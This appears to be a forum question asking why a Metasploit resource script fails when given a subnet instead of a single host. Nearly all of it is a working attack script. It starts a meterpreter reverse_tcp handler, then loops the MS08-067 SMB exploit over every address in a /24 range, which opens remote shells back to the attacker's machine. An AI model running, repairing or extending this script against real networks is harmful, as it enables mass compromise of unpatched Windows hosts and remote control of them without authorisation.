Why is this not working?

When i set "rhosts = "10.1.1.16" it works fine

use multi/handler
setg PAYLOAD windows/meterpreter/reverse_tcp
setg LHOST 10.1.1.11
setg LPORT 4473
set ExitOnSession false

exploit -j -z
use exploit/windows/smb/ms08_067_netapi
set DisablePayloadHandler true
set TARGET 0
<ruby>
require 'rex/socket/range_walker'
rhosts = "10.1.1.16/24"
iplist = Rex::Socket::RangeWalker.new(rhosts)
iplist.each do |rhost|
self.run_single("set RHOST #{rhost}")
self.run_single("exploit -j -z")

end
</ruby>